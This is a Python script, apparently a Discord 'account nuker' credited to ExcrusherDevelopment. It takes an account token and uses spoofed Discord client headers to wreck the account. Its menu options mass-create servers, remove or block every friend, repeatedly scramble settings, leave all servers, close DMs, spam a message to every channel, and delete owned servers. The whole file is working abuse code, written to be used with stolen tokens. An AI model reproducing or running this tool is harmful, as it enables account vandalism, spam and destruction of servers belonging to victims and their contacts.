import os
import colorama
import fade
import re
import io
import sys
import time
from colorama import Fore
import threading
import token
import random
import requests
import json
import shutil
import ctypes
import zipfile
import subprocess
import pylibcheck
from pystyle import *
from time import sleep
from colorama import Fore
from bs4 import BeautifulSoup
from distutils.version import LooseVersion
from urllib.request import urlopen, urlretrieve
from multiprocessing.spawn import spawn_main
from pystyle import Add, Center, Anime, Colors, Colorate, Write, System
import requests, os, sys, re, time, random, os.path, string, subprocess, random, threading, ctypes, shutil
import ctypes
ctypes.windll.kernel32.SetConsoleTitleW('Account Tools    |    Made by Aku Ajel#2581')

def randstr(lenn):
    alpha = "abcdefghijklmnopqrstuvwxyz0123456789"
    text = ''
    for i in range(0, lenn):
        text += alpha[random.randint(0, len(alpha) - 1)]

    return text


def mainHeader(token):
    return {
        "authorization": token,
        "accept": "*/*",
        'accept-encoding': 'gzip, deflate, br',
        "accept-language": "en-GB",
        "content-length": "90",
        "content-type": "application/json",
        "cookie": f"__cfuid={randstr(43)}; __dcfduid={randstr(32)}; locale=en-US",
        "origin": "https://discord.com",
        "sec-fetch-dest": "empty",
        "sec-fetch-mode": "cors",
        "sec-fetch-site": "same-origin",
        "user-agent": "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) discord/1.0.9003 Chrome/91.0.4472.164 Electron/13.4.0 Safari/537.36",
        "x-debug-options": "bugReporterEnabled",
        "x-super-properties": "eyJvcyI6IldpbmRvd3MiLCJicm93c2VyIjoiRGlzY29yZCBDbGllbnQiLCJyZWxlYXNlX2NoYW5uZWwiOiJzdGFibGUiLCJjbGllbnRfdmVyc2lvbiI6IjEuMC45MDAzIiwib3NfdmVyc2lvbiI6IjEwLjAuMjI0NjMiLCJvc19hcmNoIjoieDY0Iiwic3lzdGVtX2xvY2FsZSI6InNrIiwiY2xpZW50X2J1aWxkX251bWJlciI6OTkwMTYsImNsaWVudF9ldmVudF9zb3VyY2UiOm51bGx9"
    }


def secondHeader(token):
    return {
        ':authority': 'discord.com',
        ':method': 'PATCH',
        ':path': '/api/v9/users/@me',
        ':scheme': 'https',
        'accept': '*/*',
        'accept-encoding': 'gzip, deflate, br',
        'accept-language': 'en-US',
        'authorization': token,
        'content-length': '124',
        'content-type': 'application/json',
        'Cookie': f"__cfuid={randstr(43)}; __dcfduid={randstr(32)}; locale=en-US",
        'origin': 'https://canary.discord.com',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'same-origin',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) discord/1.0.616 Chrome/91.0.4472.164 Electron/13.4.0 Safari/537.36',
        'x-debug-options': 'bugReporterEnabled',
        'x-super-properties': 'eyJvcyI6IldpbmRvd3MiLCJicm93c2VyIjoiRGlzY29yZCBDbGllbnQiLCJyZWxlYXNlX2NoYW5uZWwiOiJjYW5hcnkiLCJjbGllbnRfdmVyc2lvbiI6IjEuMC42MTYiLCJvc192ZXJzaW9uIjoiMTAuMC4yMjQ1OCIsIm9zX2FyY2giOiJ4NjQiLCJzeXN0ZW1fbG9jYWxlIjoic2siLCJjbGllbnRfYnVpbGRfbnVtYmVyIjo5ODgyMywiY2xpZW50X2V2ZW50X3NvdXJjZSI6bnVsbH0='}

clear = lambda: os.system('cls')
clear()

os.system('cls')
gang = r'''
███████╗██╗  ██╗ ██████╗██████╗ ██╗   ██╗███████╗██╗  ██╗███████╗██████╗
██╔════╝ ██╗██╔╝██╔════╝██╔══██╗██║   ██║██╔════╝██║  ██║██╔════╝██╔══██╗
█████╗    ███╔╝ ██║     ██████╔╝██║   ██║███████╗███████║█████╗  ██████╔╝
██╔══╝   ██╔██╗ ██║     ██╔══██╗██║   ██║╚════██║██╔══██║██╔══╝  ██╔══██╗
███████╗██╔╝ ██╗╚██████╗██║  ██║╚██████╔╝███████║██║  ██║███████╗██║  ██║
╚══════╝╚═╝  ╚═╝ ╚═════╝╚═╝  ╚═╝ ╚═════╝ ╚══════╝╚═╝  ╚═╝╚══════╝╚═╝  ╚═╝
[>] Press enter'''
System.Size(120, 30)
System.Clear()
Anime.Fade(Center.Center(gang), Colors.purple_to_blue, Colorate.Vertical, interval=0.030, enter=True)
list = r'''
   _____                                   __    ___________           .__          
  /  _  \   ____  ____  ____  __ __  _____/  |_  \__    ___/___   ____ |  |   ______
 /  /_\  \_/ ___\/ ___\/  _ \|  |  \/    \   __\   |    | /  _ \ /  _ \|  |  /  ___/
/    |    \  \__\  \__(  <_> )  |  /   |  \  |     |    |(  <_> |  <_> )  |__\___ \ 
\____|__  /\___  >___  >____/|____/|___|  /__|     |____| \____/ \____/|____/____  >
        \/     \/    \/                 \/                                       \/

╔══════════════════════════════════╗
║[>] Made by ExcrusherDevelopment  ║
║[>] https://discord.gg/dfwcyRJEhN ║
║══════════════════════════════════║
║[1] Server Spam                   ║
║[2] Remove all Friends            ║
║[3] Block all Friends             ║
║[4] Spam Settings                 ║
║[5] Leave all Servers             ║
║[6] Close all DMs                 ║
║[7] Friend Mass DM                ║
║[8] Delete all Personal Servers   ║
╚══════════════════════════════════╝'''
faded_text = fade.purplepink(list)
print(faded_text)
tokenn = input("\n[\x1b[95m>\x1b[95m\x1B[37m] Token: ")
def servers(token):
            cumt = int(input('[\x1b[95m>\x1b[95m\x1B[37m] How Many Channels Do You Want To Create?: '))
            server_name = input('[\x1b[95m>\x1b[95m\x1B[37m] Server Name: ')
            headers = mainHeader(token)
            for i in range(cumt):
                payload = {"name": server_name}
                requests.post(
                    "https://discord.com/api/v9/guilds", headers=headers, json=payload
                )

def remove_friends(token):
            headers = {"authorization": token, "user-agent": "Mozilla/5.0"}
            rmvfr = requests.get(
                "https://discord.com/api/v9/users/@me/relationships", headers=headers
            ).json()
            for i in rmvfr:
                requests.delete(
                    f"https://discord.com/api/v9/users/@me/relationships/{i['id']}",
                    headers=headers,
                )
                print(f"{Fore.LIGHTGREEN_EX}[>]{Fore.RESET} Removed Friend {i['id']}")

def block_friends(token):
            headers = {"authorization": token, "user-agent": "bruh6/9"}
            json = {"type": 2}
            blck = requests.get(
                "https://discord.com/api/v9/users/@me/relationships", headers=headers
            ).json()
            for i in blck:
                requests.put(
                    f"https://discord.com/api/v9/users/@me/relationships/{i['id']}",
                    headers=headers,
                    json=json,
                )
                print(f"{Fore.LIGHTGREEN_EX}[!] Blocked Friend {i['id']} {Fore.RESET}")

def settings(token):
            print(f'[{Fore.LIGHTGREEN_EX}>{Fore.RESET}] Starting')
            for i in range(0, 100):
                headers = mainHeader(token)
                changset = True
                payload = {"theme": "light", "developer_mode": changset, "afk_timeout": 60, "locale": "ko",
                           "message_display_compact": changset, "explicit_content_filter": 2,
                           "default_guilds_restricted": changset,
                           "friend_source_flags": {"all": changset, "mutual_friends": changset,
                                                   "mutual_guilds": changset},
                           "inline_embed_media": changset, "inline_attachment_media": changset,
                           "gif_auto_play": changset, "render_embeds": changset,
                           "render_reactions": changset, "animate_emoji": changset,
                           "convert_emoticons": changset, "animate_stickers": 1,
                           "enable_tts_command": changset, "native_phone_integration_enabled": changset,
                           "contact_sync_enabled": changset, "allow_accessibility_detection": changset,
                           "stream_notifications_enabled": changset, "status": "idle",
                           "detect_platform_accounts": changset, "disable_games_tab": changset}
                requests.patch("https://canary.discord.com/api/v8/users/@me/settings", headers=headers, json=payload)
                changset = False
                payload = {"theme": "dark", "developer_mode": changset, "afk_timeout": 120, "locale": "bg",
                           "message_display_compact": changset, "explicit_content_filter": 0,
                           "default_guilds_restricted": changset,
                           "friend_source_flags": {"all": changset, "mutual_friends": changset,
                                                   "mutual_guilds": changset},
                           "inline_embed_media": changset, "inline_attachment_media": changset,
                           "gif_auto_play": changset, "render_embeds": changset,
                           "render_reactions": changset, "animate_emoji": changset,
                           "convert_emoticons": changset, "animate_stickers": 2,
                           "enable_tts_command": changset, "native_phone_integration_enabled": changset,
                           "contact_sync_enabled": changset, "allow_accessibility_detection": changset,
                           "stream_notifications_enabled": changset, "status": "dnd",
                           "detect_platform_accounts": changset, "disable_games_tab": changset}
                requests.patch("https://discord.com/api/v9/users/@me/settings", headers=headers, json=payload)

def server_leave(token):
            headers = {"authorization": token, "user-agent": "bruh6/9"}
            levlservr = requests.get(
                "https://discord.com/api/v9/users/@me/guilds", headers=headers
            ).json()
            for serr in levlservr:
                requests.delete(
                    f"https://discord.com/api/v9/users/@me/guilds/{serr['id']}",
                    headers=headers,
                )
                print(f"{Fore.LIGHTGREEN_EX}[!]{Fore.RESET} Left Guild: {serr['id']}")

def dms_close(token):
            headers = {"authorization": token, "user-agent": "Mozilla/5.0"}
            clsdms = requests.get(
                "https://discord.com/api/v9/users/@me/channels", headers=headers
            ).json()
            for channel in clsdms:
                requests.delete(
                    f"https://discord.com/api/v9/channels/{channel['id']}",
                    headers=headers,
                )

def mass_dm(token):
            message = input('Message: ')
            headers = {"authorization": token, "user-agent": "Mozilla/5.0"}
            reqmas = requests.get(
                "https://discord.com/api/v9/users/@me/channels", headers=headers
            ).json()
            for chen in reqmas:
                json = {"content": message}
                time.sleep(1)
                requests.post(
                    f"https://discord.com/api/v9/channels/{chen['id']}/messages",
                    headers=headers,
                    data=json,
                )
                print(f"{Fore.LIGHTGREEN_EX}[>]{Fore.RESET} {chen['id']} Sent")

def delete_servers(token):
            headers = {"authorization": token, "user-agent": "Mozilla/5.0"}
            print(f"{Fore.LIGHTGREEN_EX}[>]{Fore.RESET} Deleting...")
            dmms = requests.get(
                "https://discord.com/api/v9/users/@me/guilds", headers=headers
            ).json()
            for i in dmms:
                requests.post(
                    f"https://discord.com/api/v9/guilds/{i['id']}/delete",
                    headers=headers,
                )
                print(f'{Fore.LIGHTGREEN_EX}[>]{Fore.RESET} {i["id"]} deleted')

options = {
            "1": servers,
            "2": remove_friends,
            "3": block_friends,
            "4": settings,
            "5": server_leave,
            "6": dms_close,
            "7": mass_dm,
            "8": delete_servers
        }

def main():
            choiceee = input("\n[\x1b[95m>\x1b[95m\x1B[37m] Choice: ")
            threading.Thread(target=options[choiceee](tokenn)).start()

if __name__ == "__main__":
            while 1:
                main()

time.sleep(1)

exit = clear()